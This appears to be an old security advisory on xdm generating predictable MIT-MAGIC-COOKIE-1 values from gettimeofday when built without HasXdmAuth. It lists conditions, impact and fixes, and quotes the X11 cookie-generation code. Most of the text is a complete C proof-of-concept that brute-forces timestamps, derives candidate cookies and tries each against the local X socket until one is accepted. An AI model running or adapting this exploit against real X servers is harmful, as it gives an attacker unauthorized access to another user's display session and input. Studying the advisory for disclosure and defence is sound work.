##
## advisory for xdm cookies fast brute force
##

Current versions of xdm are sensitive to trivial brute force attack if
it is compiled with bad options, mainly HasXdmXauth.

Without this option, cookie is generated from gettimeofday(2).  If you
know starting time of xdm login session, computation of the coookie
just takes a few seconds.

Necessary conditions for the bug to be exploited :
- have access to X11 socket (TCP or UNIX) ;
- know starting date of xdm login session;
- no need for big computation power (pentium 200MHz should be enough).

Drawbacks due to exploitation of the bug :
- victim's X server consumes much system resource ;
- many X server configurations let it generate many logs entries.

Solutions :
- use good compilation options ;
- limit access to X11 sockets (start X server with "-nolisten tcp"...)

[Frome release notes]
Since xdm is dynamically linked, there's no issue on export restriction out-
side US for this binary distribution of xdm: it does not contain the DES
encryption code. So it's now included in the bin package.

However the file xc/lib/Xdmcp/WrapHelp.c is not included in the XFree86-3.3
source, so support for XDM-AUTHORIZATION-1 is not included here. You'll have
to get WrapHelp.c and rebuild xdm after having set HasXdmAuth in
xf86site.def.

The file is available within the US; for details see ftp.x.org:/pub/R6/xdm-
auth/README.
[.]

X11 code:

---8<---

void
GenerateAuthData (char *auth, int len)
{
    long            ldata[2];

#ifdef ITIMER_REAL
    {
        struct timeval  now;

        X_GETTIMEOFDAY (&now);
        ldata[0] = now.tv_usec;
        ldata[1] = now.tv_sec;
    }
#else
    {
#ifndef __EMX__
        long    time ();
#endif

        ldata[0] = time ((long *) 0);
        ldata[1] = getpid ();
    }
#endif
#ifdef HASXDMAUTH
    {
        int                 bit;
        int                 i;
        auth_wrapper_schedule    schedule;
        unsigned char       data[8];
        static int          xdmcpAuthInited;

        longtochars (ldata[0], data+0);
        longtochars (ldata[1], data+4);
        if (!xdmcpAuthInited)
        {
            InitXdmcpWrapper ();
            xdmcpAuthInited = 1;
        }
        _XdmcpAuthSetup (key, schedule);
        for (i = 0; i < len; i++) {
            auth[i] = 0;
            for (bit = 1; bit < 256; bit <<= 1) {
                _XdmcpAuthDoIt (data, data, schedule, 1);
                if ((data[0] + data[1]) & 0x4)
                    auth[i] |= bit;
            }
        }
    }
#else
    {
        int         seed;
        int         value;
        int         i;

        seed = (ldata[0]) + (ldata[1] << 16);
        xdm_srand (seed);
        for (i = 0; i < len; i++)
        {
            value = xdm_rand ();
            auth[i] = (value & 0xff00) >> 8;
        }
        value = len;
        if (value > sizeof (key))
            value = sizeof (key);
        memmove( (char *) key, auth, value);
    }
#endif
}

---8<---

proof of the concept (to be adapted depending on your version)


---8<---
/*
** xdm-cookie-exploit.c
**
** Made by (ntf & sky)
** Login    <ntf@epita.fr>, <sky@epita.fr>
**
** Last update Sun Jun 24 21:38:48 2001 root
*/
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <sys/un.h>

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <time.h>
#include <X11/Xmd.h>
#include <X11/X.h>
#include <signal.h>

void doit(struct timeval t);
void die(char *perror_msg); /* TODO: terminal function */

#define COOKIE_SZ 16
#define TRUE  42

struct  s_x11_hdr
{
  char  endian;
  char  pad1;
  CARD16 protocol_major_version;
  CARD16 protocol_minor_version;
  CARD16 authorization_protocol_name_length;
  CARD16 authorization_protocol_data_length;
  CARD16 pad2;
  char  authorization_protocol_name[20];
  char  authorization_protocol_data[16];
};

static unsigned  long int next = 1;
static unsigned int  total = 0;

void on_sigint(int sig)
{
  printf("total: %d\n", total);
}

int main(ac,av)
int ac;
char *av[];
{
  struct timeval t;

  if (ac < 3)
    {
      fprintf (stderr, "%s: usage time_insec time_inusec\n", av[0]);
      exit (4);
    }
  t.tv_sec = atoi(av[1]);
  t.tv_usec = atoi(av[2]);
  printf("sec == %lu\nusec == %lu\n", t.tv_sec, t.tv_usec);
  doit(t);
  return (0);
}



static int inline xdm_rand(void)
{
    next = next * 1103515245 + 12345;
    return (unsigned int)(next / 65536) % 32768;
}

void print_cookie(unsigned char cookie[COOKIE_SZ])
{
  int i;

  printf("cookie=");
  for (i = 0; i < COOKIE_SZ; i++)
    printf("%02x", cookie[i]);
  printf("\n");
}


void  doit(t)
struct timeval t;
{
  unsigned char  cookie[COOKIE_SZ];
  long   ldata[2];
  struct sockaddr_un addr;
  char   buffer[1024];
  struct s_x11_hdr x11hdr;

  ldata[0] = t.tv_usec;
  ldata[1] = t.tv_sec;
  total = 0;
  x11hdr.endian = 'l';
  x11hdr.protocol_major_version = X_PROTOCOL;
  x11hdr.protocol_minor_version = X_PROTOCOL_REVISION;
  x11hdr.authorization_protocol_name_length = 18;
  x11hdr.authorization_protocol_data_length = 16;
  bcopy("MIT-MAGIC-COOKIE-1", x11hdr.authorization_protocol_name, 18);
  for (total = 0; TRUE; total++)
    {
      int fd;
      int i;

      if (!ldata[0])
 ldata[1]--;
      ldata[0]--;
      if ((fd = socket(PF_LOCAL, SOCK_STREAM, 0)) == -1)
 die("socket");
      memset(&addr, 0, sizeof(addr));
      addr.sun_family = AF_LOCAL;
      strcpy(addr.sun_path, "/tmp/.X11-unix/X0");
      if ((connect(fd, (struct sockaddr*)&addr, sizeof(addr))) == -1)
 die("connect");
      next = (ldata[0]) + (ldata[1] << 16);
      for (i = 0; i < 16; i++)
 cookie[i] = (xdm_rand() & 0xff00) >> 8;
      bcopy(cookie, x11hdr.authorization_protocol_data, 16);
      if (write(fd, &x11hdr, sizeof(x11hdr)) == -1)
 die("write");
      if (read(fd, buffer, sizeof(buffer)) == -1)
 die("read");
      if (buffer[0])
 {
   printf("SUCCESS: ");
   print_cookie(cookie);
   exit(0);
 }
      if (!(total % 1000))
 {
   printf(".");
   fflush(stdout);
 }
      close(fd);
    }
  exit(42);
}

void die(str)
char *str;
{
  perror(str);
  exit(4);
}
---8<---

--
NtF - ntf@epita.fr
Sky - sky@epita.fr
